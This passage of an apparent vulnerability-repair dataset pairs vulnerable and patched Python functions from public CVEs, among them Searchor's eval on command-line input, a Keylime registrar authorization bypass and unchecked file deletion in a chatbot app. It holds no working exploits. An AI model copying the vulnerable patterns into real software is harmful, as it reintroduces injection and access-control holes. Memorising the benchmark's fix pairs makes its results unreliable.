= check_proxy(proxies)\n\n    gr_L1 = lambda: gr.Row().style()\n    gr_L2 = lambda scale: gr.Column(scale=scale)\n    if LAYOUT == \"TOP-DOWN\":\n        gr_L1 = lambda: DummyWith()\n        gr_L2 = lambda scale: gr.Row()\n        CHATBOT_HEIGHT /= 2\n\n    cancel_handles = []\n    with gr.Blocks(title=\"ChatGPT \\u5b66\\u672f\\u4f18\\u5316\", theme=set_theme, analytics_enabled=False, css=advanced_css) as demo:\n        gr.HTML(title_html)\n        cookies = gr.State({'api_key': API_KEY, 'llm_model': LLM_MODEL})\n        with gr_L1():\n            with gr_L2(scale=2):\n                chatbot = gr.Chatbot(label=f\"\\u5f53\\u524d\\u6a21\\u578b\\uff1a{LLM_MODEL}\")\n                chatbot.style(height=CHATBOT_HEIGHT)\n                history = gr.State([])\n            with gr_L2(scale=1):\n                with gr.Accordion(\"\\u8f93\\u5165\\u533a\", open=True) as area_input_primary:\n                    with gr.Row():\n                        txt = gr.Textbox(show_label=False, placeholder=\"Input question here.\").style(container=False)\n                    with gr.Row():\n                        submitBtn = gr.Button(\"\\u63d0\\u4ea4\", variant=\"primary\")\n                    with gr.Row():\n                        resetBtn = gr.Button(\"\\u91cd\\u7f6e\", variant=\"secondary\"); resetBtn.style(size=\"sm\")\n                        stopBtn = gr.Button(\"\\u505c\\u6b62\", variant=\"secondary\"); stopBtn.style(size=\"sm\")\n                        clearBtn = gr.Button(\"\\u6e05\\u9664\", variant=\"secondary\", visible=False); clearBtn.style(size=\"sm\")\n                    with gr.Row():\n                        status = gr.Markdown(f\"Tip: \\u6309Enter\\u63d0\\u4ea4, \\u6309Shift+Enter\\u6362\\u884c\\u3002\\u5f53\\u524d\\u6a21\\u578b: {LLM_MODEL} \\n {proxy_info}\")\n                with gr.Accordion(\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", open=True) as area_basic_fn:\n                    with gr.Row():\n                        for k in functional:\n                            if (\"Visible\" in functional[k]) and (not functional[k][\"Visible\"]): continue\n                            variant = functional[k][\"Color\"] if \"Color\" in functional[k] else \"secondary\"\n                            functional[k][\"Button\"] = gr.Button(k, variant=variant)\n                with gr.Accordion(\"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\", open=True) as area_crazy_fn:\n                    with gr.Row():\n                        gr.Markdown(\"\\u6ce8\\u610f\\uff1a\\u4ee5\\u4e0b\\u201c\\u7ea2\\u989c\\u8272\\u201d\\u6807\\u8bc6\\u7684\\u51fd\\u6570\\u63d2\\u4ef6\\u9700\\u4ece\\u8f93\\u5165\\u533a\\u8bfb\\u53d6\\u8def\\u5f84\\u4f5c\\u4e3a\\u53c2\\u6570.\")\n                    with gr.Row():\n                        for k in crazy_fns:\n                            if not crazy_fns[k].get(\"AsButton\", True): continue\n                            variant = crazy_fns[k][\"Color\"] if \"Color\" in crazy_fns[k] else \"secondary\"\n                            crazy_fns[k][\"Button\"] = gr.Button(k, variant=variant)\n                            crazy_fns[k][\"Button\"].style(size=\"sm\")\n                    with gr.Row():\n                        with gr.Accordion(\"\\u66f4\\u591a\\u51fd\\u6570\\u63d2\\u4ef6\", open=True):\n                            dropdown_fn_list = [k for k in crazy_fns.keys() if not crazy_fns[k].get(\"AsButton\", True)]\n                            with gr.Row():\n                                dropdown = gr.Dropdown(dropdown_fn_list, value=r\"\\u6253\\u5f00\\u63d2\\u4ef6\\u5217\\u8868\", label=\"\").style(container=False)\n                            with gr.Row():\n                                plugin_advanced_arg = gr.Textbox(show_label=True, label=\"\\u9ad8\\u7ea7\\u53c2\\u6570\\u8f93\\u5165\\u533a\", visible=False, \n                                                                 placeholder=\"\\u8fd9\\u91cc\\u662f\\u7279\\u6b8a\\u51fd\\u6570\\u63d2\\u4ef6\\u7684\\u9ad8\\u7ea7\\u53c2\\u6570\\u8f93\\u5165\\u533a\").style(container=False)\n                            with gr.Row():\n                                switchy_bt = gr.Button(r\"\\u8bf7\\u5148\\u4ece\\u63d2\\u4ef6\\u5217\\u8868\\u4e2d\\u9009\\u62e9\", variant=\"secondary\")\n                    with gr.Row():\n                        with gr.Accordion(\"\\u70b9\\u51fb\\u5c55\\u5f00\\u201c\\u6587\\u4ef6\\u4e0a\\u4f20\\u533a\\u201d\\u3002\\u4e0a\\u4f20\\u672c\\u5730\\u6587\\u4ef6\\u53ef\\u4f9b\\u7ea2\\u8272\\u51fd\\u6570\\u63d2\\u4ef6\\u8c03\\u7528\\u3002\", open=False) as area_file_up:\n                            file_upload = gr.Files(label=\"\\u4efb\\u4f55\\u6587\\u4ef6, \\u4f46\\u63a8\\u8350\\u4e0a\\u4f20\\u538b\\u7f29\\u6587\\u4ef6(zip, tar)\", file_count=\"multiple\")\n                with gr.Accordion(\"\\u66f4\\u6362\\u6a21\\u578b & SysPrompt & \\u4ea4\\u4e92\\u754c\\u9762\\u5e03\\u5c40\", open=(LAYOUT == \"TOP-DOWN\")):\n                    system_prompt = gr.Textbox(show_label=True, placeholder=f\"System Prompt\", label=\"System prompt\", value=initial_prompt)\n                    top_p = gr.Slider(minimum=-0, maximum=1.0, value=1.0, step=0.01,interactive=True, label=\"Top-p (nucleus sampling)\",)\n                    temperature = gr.Slider(minimum=-0, maximum=2.0, value=1.0, step=0.01, interactive=True, label=\"Temperature\",)\n                    max_length_sl = gr.Slider(minimum=256, maximum=4096, value=512, step=1, interactive=True, label=\"Local LLM MaxLength\",)\n                    checkboxes = gr.CheckboxGroup([\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", \"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\", \"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\", \"\\u8f93\\u5165\\u6e05\\u9664\\u952e\", \"\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\"], value=[\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\", \"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\"], label=\"\\u663e\\u793a/\\u9690\\u85cf\\u529f\\u80fd\\u533a\")\n                    md_dropdown = gr.Dropdown(AVAIL_LLM_MODELS, value=LLM_MODEL, label=\"\\u66f4\\u6362LLM\\u6a21\\u578b/\\u8bf7\\u6c42\\u6e90\").style(container=False)\n\n                    gr.Markdown(description)\n                with gr.Accordion(\"\\u5907\\u9009\\u8f93\\u5165\\u533a\", open=True, visible=False) as area_input_secondary:\n                    with gr.Row():\n                        txt2 = gr.Textbox(show_label=False, placeholder=\"Input question here.\", label=\"\\u8f93\\u5165\\u533a2\").style(container=False)\n                    with gr.Row():\n                        submitBtn2 = gr.Button(\"\\u63d0\\u4ea4\", variant=\"primary\")\n                    with gr.Row():\n                        resetBtn2 = gr.Button(\"\\u91cd\\u7f6e\", variant=\"secondary\"); resetBtn2.style(size=\"sm\")\n                        stopBtn2 = gr.Button(\"\\u505c\\u6b62\", variant=\"secondary\"); stopBtn2.style(size=\"sm\")\n                        clearBtn2 = gr.Button(\"\\u6e05\\u9664\", variant=\"secondary\", visible=False); clearBtn2.style(size=\"sm\")\n        # \\u529f\\u80fd\\u533a\\u663e\\u793a\\u5f00\\u5173\\u4e0e\\u529f\\u80fd\\u533a\\u7684\\u4e92\\u52a8\n        def fn_area_visibility(a):\n            ret = {}\n            ret.update({area_basic_fn: gr.update(visible=(\"\\u57fa\\u7840\\u529f\\u80fd\\u533a\" in a))})\n            ret.update({area_crazy_fn: gr.update(visible=(\"\\u51fd\\u6570\\u63d2\\u4ef6\\u533a\" in a))})\n            ret.update({area_input_primary: gr.update(visible=(\"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" not in a))})\n            ret.update({area_input_secondary: gr.update(visible=(\"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" in a))})\n            ret.update({clearBtn: gr.update(visible=(\"\\u8f93\\u5165\\u6e05\\u9664\\u952e\" in a))})\n            ret.update({clearBtn2: gr.update(visible=(\"\\u8f93\\u5165\\u6e05\\u9664\\u952e\" in a))})\n            ret.update({plugin_advanced_arg: gr.update(visible=(\"\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\" in a))})\n            if \"\\u5e95\\u90e8\\u8f93\\u5165\\u533a\" in a: ret.update({txt: gr.update(value=\"\")})\n            return ret\n        checkboxes.select(fn_area_visibility, [checkboxes], [area_basic_fn, area_crazy_fn, area_input_primary, area_input_secondary, txt, txt2, clearBtn, clearBtn2, plugin_advanced_arg] )\n        # \\u6574\\u7406\\u53cd\\u590d\\u51fa\\u73b0\\u7684\\u63a7\\u4ef6\\u53e5\\u67c4\\u7ec4\\u5408\n        input_combo = [cookies, max_length_sl, md_dropdown, txt, txt2, top_p, temperature, chatbot, history, system_prompt, plugin_advanced_arg]\n        output_combo = [cookies, chatbot, history, status]\n        predict_args = dict(fn=ArgsGeneralWrapper(predict), inputs=input_combo, outputs=output_combo)\n        # \\u63d0\\u4ea4\\u6309\\u94ae\\u3001\\u91cd\\u7f6e\\u6309\\u94ae\n        cancel_handles.append(txt.submit(**predict_args))\n        cancel_handles.append(txt2.submit(**predict_args))\n        cancel_handles.append(submitBtn.click(**predict_args))\n        cancel_handles.append(submitBtn2.click(**predict_args))\n        resetBtn.click(lambda: ([], [], \"\\u5df2\\u91cd\\u7f6e\"), None, [chatbot, history, status])\n        resetBtn2.click(lambda: ([], [], \"\\u5df2\\u91cd\\u7f6e\"), None, [chatbot, history, status])\n        clearBtn.click(lambda: (\"\",\"\"), None, [txt, txt2])\n        clearBtn2.click(lambda: (\"\",\"\"), None, [txt, txt2])\n        # \\u57fa\\u7840\\u529f\\u80fd\\u533a\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        for k in functional:\n            if (\"Visible\" in functional[k]) and (not functional[k][\"Visible\"]): continue\n            click_handle = functional[k][\"Button\"].click(fn=ArgsGeneralWrapper(predict), inputs=[*input_combo, gr.State(True), gr.State(k)], outputs=output_combo)\n            cancel_handles.append(click_handle)\n        # \\u6587\\u4ef6\\u4e0a\\u4f20\\u533a\\uff0c\\u63a5\\u6536\\u6587\\u4ef6\\u540e\\u4e0echatbot\\u7684\\u4e92\\u52a8\n        file_upload.upload(on_file_uploaded, [file_upload, chatbot, txt, txt2, checkboxes], [chatbot, txt, txt2])\n        # \\u51fd\\u6570\\u63d2\\u4ef6-\\u56fa\\u5b9a\\u6309\\u94ae\\u533a\n        for k in crazy_fns:\n            if not crazy_fns[k].get(\"AsButton\", True): continue\n            click_handle = crazy_fns[k][\"Button\"].click(ArgsGeneralWrapper(crazy_fns[k][\"Function\"]), [*input_combo, gr.State(PORT)], output_combo)\n            click_handle.then(on_report_generated, [file_upload, chatbot], [file_upload, chatbot])\n            cancel_handles.append(click_handle)\n        # \\u51fd\\u6570\\u63d2\\u4ef6-\\u4e0b\\u62c9\\u83dc\\u5355\\u4e0e\\u968f\\u53d8\\u6309\\u94ae\\u7684\\u4e92\\u52a8\n        def on_dropdown_changed(k):\n            variant = crazy_fns[k][\"Color\"] if \"Color\" in crazy_fns[k] else \"secondary\"\n            ret = {switchy_bt: gr.update(value=k, variant=variant)}\n            if crazy_fns[k].get(\"AdvancedArgs\", False): # \\u662f\\u5426\\u5524\\u8d77\\u9ad8\\u7ea7\\u63d2\\u4ef6\\u53c2\\u6570\\u533a\n                ret.update({plugin_advanced_arg: gr.update(visible=True,  label=f\"\\u63d2\\u4ef6[{k}]\\u7684\\u9ad8\\u7ea7\\u53c2\\u6570\\u8bf4\\u660e\\uff1a\" + crazy_fns[k].get(\"ArgsReminder\", [f\"\\u6ca1\\u6709\\u63d0\\u4f9b\\u9ad8\\u7ea7\\u53c2\\u6570\\u529f\\u80fd\\u8bf4\\u660e\"]))})\n            else:\n                ret.update({plugin_advanced_arg: gr.update(visible=False, label=f\"\\u63d2\\u4ef6[{k}]\\u4e0d\\u9700\\u8981\\u9ad8\\u7ea7\\u53c2\\u6570\\u3002\")})\n            return ret\n        dropdown.select(on_dropdown_changed, [dropdown], [switchy_bt, plugin_advanced_arg] )\n        def on_md_dropdown_changed(k):\n            return {chatbot: gr.update(label=\"\\u5f53\\u524d\\u6a21\\u578b\\uff1a\"+k)}\n        md_dropdown.select(on_md_dropdown_changed, [md_dropdown], [chatbot] )\n        # \\u968f\\u53d8\\u6309\\u94ae\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        def route(k, *args, **kwargs):\n            if k in [r\"\\u6253\\u5f00\\u63d2\\u4ef6\\u5217\\u8868\", r\"\\u8bf7\\u5148\\u4ece\\u63d2\\u4ef6\\u5217\\u8868\\u4e2d\\u9009\\u62e9\"]: return\n            yield from ArgsGeneralWrapper(crazy_fns[k][\"Function\"])(*args, **kwargs)\n        click_handle = switchy_bt.click(route,[switchy_bt, *input_combo, gr.State(PORT)], output_combo)\n        click_handle.then(on_report_generated, [file_upload, chatbot], [file_upload, chatbot])\n        cancel_handles.append(click_handle)\n        # \\u7ec8\\u6b62\\u6309\\u94ae\\u7684\\u56de\\u8c03\\u51fd\\u6570\\u6ce8\\u518c\n        stopBtn.click(fn=None, inputs=None, outputs=None, cancels=cancel_handles)\n        stopBtn2.click(fn=None, inputs=None, outputs=None, cancels=cancel_handles)\n\n    # gradio\\u7684inbrowser\\u89e6\\u53d1\\u4e0d\\u592a\\u7a33\\u5b9a\\uff0c\\u56de\\u6eda\\u4ee3\\u7801\\u5230\\u539f\\u59cb\\u7684\\u6d4f\\u89c8\\u5668\\u6253\\u5f00\\u51fd\\u6570\n    def auto_opentab_delay():\n        import threading, webbrowser, time\n        print(f\"\\u5982\\u679c\\u6d4f\\u89c8\\u5668\\u6ca1\\u6709\\u81ea\\u52a8\\u6253\\u5f00\\uff0c\\u8bf7\\u590d\\u5236\\u5e76\\u8f6c\\u5230\\u4ee5\\u4e0bURL\\uff1a\")\n        print(f\"\\t\\uff08\\u4eae\\u8272\\u4e3b\\u9898\\uff09: http://localhost:{PORT}\")\n        print(f\"\\t\\uff08\\u6697\\u8272\\u4e3b\\u9898\\uff09: http://localhost:{PORT}/?__theme=dark\")\n        def open():\n            time.sleep(2)       # \\u6253\\u5f00\\u6d4f\\u89c8\\u5668\n            DARK_MODE, = get_conf('DARK_MODE')\n            if DARK_MODE: webbrowser.open_new_tab(f\"http://localhost:{PORT}/?__theme=dark\")\n            else: webbrowser.open_new_tab(f\"http://localhost:{PORT}\")\n        threading.Thread(target=open, name=\"open-browser\", daemon=True).start()\n        threading.Thread(target=auto_update, name=\"self-upgrade\", daemon=True).start()\n        threading.Thread(target=warm_up_modules, name=\"warm-up\", daemon=True).start()\n\n    auto_opentab_delay()\n    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(\n        server_name=\"0.0.0.0\", server_port=PORT, auth=AUTHENTICATION,\n        favicon_path=\"docs/logo.png\", blocked_paths=[\"config.py\",\"config_private.py\",\"docker-compose.yml\",\"Dockerfile\"])"
      }
    ],
    "vul_patch": "--- a/main.py\n+++ b/main.py\n@@ -195,4 +195,6 @@\n         threading.Thread(target=warm_up_modules, name=\"warm-up\", daemon=True).start()\n \n     auto_opentab_delay()\n-    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(server_name=\"0.0.0.0\", server_port=PORT, auth=AUTHENTICATION, favicon_path=\"docs/logo.png\")\n+    demo.queue(concurrency_count=CONCURRENT_COUNT).launch(\n+        server_name=\"0.0.0.0\", server_port=PORT, auth=AUTHENTICATION,\n+        favicon_path=\"docs/logo.png\", blocked_paths=[\"config.py\",\"config_private.py\",\"docker-compose.yml\",\"Dockerfile\"])\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-0434",
    "cve_description": "Improper Input Validation in GitHub repository pyload/pyload prior to 0.5.0b3.dev40.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/pyload/pyload",
    "patch_url": [
      "https://github.com/pyload/pyload/commit/a2b1eb1028f45ac58dea5f58593c1d3db2b4a104"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_245_1",
        "commit": "c602df5",
        "file_path": "src/pyload/core/config/parser.py",
        "start_line": 261,
        "end_line": 293,
        "snippet": "    def cast(self, typ, value):\n        \"\"\"\n        cast value to given format.\n        \"\"\"\n        if typ == \"int\":\n            return int(value)\n\n        elif typ == \"float\":\n            return float(value)\n\n        elif typ == \"str\":\n            return \"\" if value is None else str(value)\n\n        elif typ == \"bytes\":\n            return b\"\" if value is None else bytes(value)\n\n        elif typ == \"bool\":\n            value = \"\" if value is None else str(value)\n            return value.lower() in (\"1\", \"true\", \"on\", \"yes\", \"y\")\n\n        elif typ == \"time\":\n            value = \"\" if value is None else str(value)\n            if not value:\n                value = \"0:00\"\n            if \":\" not in value:\n                value += \":00\"\n            return value\n\n        elif typ in (\"file\", \"folder\"):\n            return \"\" if value in (None, \"\") else os.path.realpath(os.path.expanduser(os.fsdecode(value)))\n\n        else:\n            return value"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_245_1",
        "commit": "a2b1eb1",
        "file_path": "src/pyload/core/config/parser.py",
        "start_line": 261,
        "end_line": 310,
        "snippet": "    def cast(self, typ, value):\n        \"\"\"\n        cast value to given format.\n        \"\"\"\n        if typ == \"int\":\n            return int(value)\n\n        elif typ == \"float\":\n            return float(value)\n\n        elif typ == \"str\":\n            return \"\" if value is None else str(value)\n\n        elif typ == \"bytes\":\n            return b\"\" if value is None else bytes(value)\n\n        elif typ == \"bool\":\n            value = \"\" if value is None else str(value)\n            return value.lower() in (\"1\", \"true\", \"on\", \"yes\", \"y\")\n\n        elif typ == \"time\":\n            default_value = \"0:00\"\n            value = \"\" if value is None else str(value)\n            if not value:\n                value = default_value\n            elif \":\" not in value:\n                value += \":00\"\n\n            hours, seconds = value.split(\":\", 1)\n            if (\n                hours.isnumeric()\n                and seconds.isnumeric()\n                and 0 <= int(hours) <= 23\n                and 0 <= int(seconds) <= 59\n            ):\n                pass\n            else:\n                value = default_value\n\n            return value\n\n        elif typ in (\"file\", \"folder\"):\n            return (\n                \"\"\n                if value in (None, \"\")\n                else os.path.realpath(os.path.expanduser(os.fsdecode(value)))\n            )\n\n        else:\n            return value"
      }
    ],
    "vul_patch": "--- a/src/pyload/core/config/parser.py\n+++ b/src/pyload/core/config/parser.py\n@@ -19,15 +19,32 @@\n             return value.lower() in (\"1\", \"true\", \"on\", \"yes\", \"y\")\n \n         elif typ == \"time\":\n+            default_value = \"0:00\"\n             value = \"\" if value is None else str(value)\n             if not value:\n-                value = \"0:00\"\n-            if \":\" not in value:\n+                value = default_value\n+            elif \":\" not in value:\n                 value += \":00\"\n+\n+            hours, seconds = value.split(\":\", 1)\n+            if (\n+                hours.isnumeric()\n+                and seconds.isnumeric()\n+                and 0 <= int(hours) <= 23\n+                and 0 <= int(seconds) <= 59\n+            ):\n+                pass\n+            else:\n+                value = default_value\n+\n             return value\n \n         elif typ in (\"file\", \"folder\"):\n-            return \"\" if value in (None, \"\") else os.path.realpath(os.path.expanduser(os.fsdecode(value)))\n+            return (\n+                \"\"\n+                if value in (None, \"\")\n+                else os.path.realpath(os.path.expanduser(os.fsdecode(value)))\n+            )\n \n         else:\n             return value\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-38201",
    "cve_description": "A flaw was found in the Keylime registrar that could allow a bypass of the challenge-response protocol during agent registration. This issue may allow an attacker to impersonate an agent and hide the true status of a monitored machine if the fake agent is added to the verifier list by a legitimate user, resulting in a breach of the integrity of the registrar database.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-639": {
        "name": "Authorization Bypass Through User-Controlled Key",
        "description": "The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data."
      }
    },
    "repo": "https://github.com/keylime/keylime",
    "patch_url": [
      "https://github.com/keylime/keylime/commit/9e5ac9f25cd400b16d5969f531cee28290543f2a"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_226_1",
        "commit": "d21f3b4",
        "file_path": "keylime/registrar_common.py",
        "start_line": 406,
        "end_line": 458,
        "snippet": "    def do_PUT(self) -> None:\n        \"\"\"This method handles the PUT requests to add agents to the Registrar Server.\n\n        Currently, only agents resources are available for PUTing, i.e. /agents. All other PUT uri's\n        will return errors.\n        \"\"\"\n        session = SessionManager().make_session(engine)\n\n        _, agent_id = self._validate_input(\"PUT\", True)\n        if not agent_id:\n            return\n\n        try:\n            content_length = int(self.headers.get(\"Content-Length\", 0))\n            if content_length == 0:\n                web_util.echo_json_response(self, 400, \"Expected non zero content length\")\n                logger.warning(\"PUT for %s returning 400 response. Expected non zero content length.\", agent_id)\n                return\n\n            post_body = self.rfile.read(content_length)\n            json_body = json.loads(post_body)\n\n            auth_tag = json_body[\"auth_tag\"]\n            try:\n                agent = session.query(RegistrarMain).filter_by(agent_id=agent_id).first()\n            except NoResultFound as e:\n                raise Exception(\"attempting to activate agent before requesting \" f\"registrar for {agent_id}\") from e\n            except SQLAlchemyError as e:\n                logger.error(\"SQLAlchemy Error: %s\", e)\n                raise\n\n            assert agent\n            assert isinstance(agent.key, str)\n            ex_mac = crypto.do_hmac(agent.key.encode(), agent_id)\n            if ex_mac == auth_tag:\n                try:\n                    session.query(RegistrarMain).filter(RegistrarMain.agent_id == agent_id).update(\n                        {\"active\": int(True)}\n                    )\n                    session.commit()\n                except SQLAlchemyError as e:\n                    logger.error(\"SQLAlchemy Error: %s\", e)\n                    raise\n            else:\n                raise Exception(f\"Auth tag {auth_tag} does not match expected value {ex_mac}\")\n\n            web_util.echo_json_response(self, 200, \"Success\")\n            logger.info(\"PUT activated: %s\", agent_id)\n        except Exception as e:\n            web_util.echo_json_response(self, 400, f\"Error: {str(e)}\")\n            logger.warning(\"PUT for %s returning 400 response. Error: %s\", agent_id, e)\n            logger.exception(e)\n            return"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_226_1",
        "commit": "9e5ac9f",
        "file_path": "keylime/registrar_common.py",
        "start_line": 408,
        "end_line": 469,
        "snippet": "    def do_PUT(self) -> None:\n        \"\"\"This method handles the PUT requests to add agents to the Registrar Server.\n\n        Currently, only agents resources are available for PUTing, i.e. /agents. All other PUT uri's\n        will return errors.\n        \"\"\"\n        session = SessionManager().make_session(engine)\n\n        _, agent_id = self._validate_input(\"PUT\", True)\n        if not agent_id:\n            return\n\n        try:\n            content_length = int(self.headers.get(\"Content-Length\", 0))\n            if content_length == 0:\n                web_util.echo_json_response(self, 400, \"Expected non zero content length\")\n                logger.warning(\"PUT for %s returning 400 response. Expected non zero content length.\", agent_id)\n                return\n\n            post_body = self.rfile.read(content_length)\n            json_body = json.loads(post_body)\n\n            auth_tag = json_body[\"auth_tag\"]\n            try:\n                agent = session.query(RegistrarMain).filter_by(agent_id=agent_id).first()\n            except NoResultFound as e:\n                raise Exception(\"attempting to activate agent before requesting \" f\"registrar for {agent_id}\") from e\n            except SQLAlchemyError as e:\n                logger.error(\"SQLAlchemy Error: %s\", e)\n                raise\n\n            assert agent\n            assert isinstance(agent.key, str)\n            ex_mac = crypto.do_hmac(agent.key.encode(), agent_id)\n            if ex_mac == auth_tag:\n                try:\n                    session.query(RegistrarMain).filter(RegistrarMain.agent_id == agent_id).update(\n                        {\"active\": int(True)}\n                    )\n                    session.commit()\n                except SQLAlchemyError as e:\n                    logger.error(\"SQLAlchemy Error: %s\", e)\n                    raise\n            else:\n                if agent_id and session.query(RegistrarMain).filter_by(agent_id=agent_id).delete():\n                    try:\n                        session.commit()\n                    except SQLAlchemyError as e:\n                        logger.error(\"SQLAlchemy Error: %s\", e)\n                        raise\n\n                raise Exception(\n                    f\"Auth tag {auth_tag} for agent {agent_id} does not match expected value. The agent has been deleted from database, and a restart of it will be required\"\n                )\n\n            web_util.echo_json_response(self, 200, \"Success\")\n            logger.info(\"PUT activated: %s\", agent_id)\n        except Exception as e:\n            web_util.echo_json_response(self, 400, f\"Error: {str(e)}\")\n            logger.warning(\"PUT for %s returning 400 response. Error: %s\", agent_id, e)\n            logger.exception(e)\n            return"
      }
    ],
    "vul_patch": "--- a/keylime/registrar_common.py\n+++ b/keylime/registrar_common.py\n@@ -42,7 +42,16 @@\n                     logger.error(\"SQLAlchemy Error: %s\", e)\n                     raise\n             else:\n-                raise Exception(f\"Auth tag {auth_tag} does not match expected value {ex_mac}\")\n+                if agent_id and session.query(RegistrarMain).filter_by(agent_id=agent_id).delete():\n+                    try:\n+                        session.commit()\n+                    except SQLAlchemyError as e:\n+                        logger.error(\"SQLAlchemy Error: %s\", e)\n+                        raise\n+\n+                raise Exception(\n+                    f\"Auth tag {auth_tag} for agent {agent_id} does not match expected value. The agent has been deleted from database, and a restart of it will be required\"\n+                )\n \n             web_util.echo_json_response(self, 200, \"Success\")\n             logger.info(\"PUT activated: %s\", agent_id)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-43364",
    "cve_description": "main.py in Searchor before 2.4.2 uses eval on CLI input, which may cause unexpected code execution.",
    "cwe_info": {
      "CWE-74": {
        "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')",
        "description": "The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/ArjunSharda/Searchor",
    "patch_url": [
      "https://github.com/ArjunSharda/Searchor/commit/16016506f7bf92b0f21f51841d599126d6fcd15b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_341_1",
        "commit": "ddbe198467ef2bd37096c5bd7b3fe313eabed39d",
        "file_path": "src/searchor/main.py",
        "start_line": 30,
        "end_line": 42,
        "snippet": "def search(engine, query, open, copy):\n    try:\n        url = eval(\n            f\"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})\"\n        )\n        click.echo(url)\n        searchor.history.update(engine, query, url)\n        if open:\n            click.echo(\"opening browser...\")\n        if copy:\n            click.echo(\"link copied to clipboard\")\n    except AttributeError:\n        print(\"engine not recognized\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_341_1",
        "commit": "16016506f7bf92b0f21f51841d599126d6fcd15b",
        "file_path": "src/searchor/main.py",
        "start_line": 30,
        "end_line": 40,
        "snippet": "def search(engine, query, open, copy):\n    try:\n        url = Engine[engine].search(query, copy_url=copy, open_web=open)\n        click.echo(url)\n        searchor.history.update(engine, query, url)\n        if open:\n            click.echo(\"opening browser...\")\n        if copy:\n            click.echo(\"link copied to clipboard\")\n    except AttributeError:\n        print(\"engine not recognized\")"
      }
    ],
    "vul_patch": "--- a/src/searchor/main.py\n+++ b/src/searchor/main.py\n@@ -1,8 +1,6 @@\n def search(engine, query, open, copy):\n     try:\n-        url = eval(\n-            f\"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})\"\n-        )\n+        url = Engine[engine].search(query, copy_url=copy, open_web=open)\n         click.echo(url)\n         searchor.history.update(engine, query, url)\n         if open:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-8613",
    "cve_description": "A vulnerability in gaizhenbiao/chuanhuchatgpt version 20240802 allows attackers to access, copy, and delete other users' chat histories. This issue arises due to improper handling of session data and lack of access control mechanisms, enabling attackers to view and manipulate chat histories of other users.",
    "cwe_info": {
      "CWE-284": {
        "name": "Improper Access Control",
        "description": "The product does not restrict or incorrectly restricts access to a resource from an unauthorized actor."
      }
    },
    "repo": "https://github.com/gaizhenbiao/chuanhuchatgpt",
    "patch_url": [
      "https://github.com/gaizhenbiao/chuanhuchatgpt/commit/526c615c437377ee9c71f866fd0f19011910f705"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_302_1",
        "commit": "226a9b2",
        "file_path": "modules/models/base_model.py",
        "start_line": 1100,
        "end_line": 1122,
        "snippet": "    def delete_chat_history(self, filename):\n        if filename == \"CANCELED\":\n            return gr.update(), gr.update(), gr.update()\n        if filename == \"\":\n            return i18n(\"\\u4f60\\u6ca1\\u6709\\u9009\\u62e9\\u4efb\\u4f55\\u5bf9\\u8bdd\\u5386\\u53f2\"), gr.update(), gr.update()\n        if not filename.endswith(\".json\"):\n            filename += \".json\"\n        if filename == os.path.basename(filename):\n            history_file_path = os.path.join(HISTORY_DIR, self.user_name, filename)\n        else:\n            history_file_path = filename\n        md_history_file_path = history_file_path[:-5] + \".md\"\n        try:\n            os.remove(history_file_path)\n            os.remove(md_history_file_path)\n            return i18n(\"\\u5220\\u9664\\u5bf9\\u8bdd\\u5386\\u53f2\\u6210\\u529f\"), get_history_list(self.user_name), []\n        except:\n            logging.info(f\"\\u5220\\u9664\\u5bf9\\u8bdd\\u5386\\u53f2\\u5931\\u8d25 {history_file_path}\")\n            return (\n                i18n(\"\\u5bf9\\u8bdd\\u5386\\u53f2\") + filename + i18n(\"\\u5df2\\u7ecf\\u88ab\\u5220\\u9664\\u5566\"),\n                get_history_list(self.user_name),\n                [],\n            )"
      },
      {
        "id": "vul_py_302_2",
        "commit": "226a9b2",
        "file_path": "modules/utils.py",
        "start_line": 383,
        "end_line": 433,
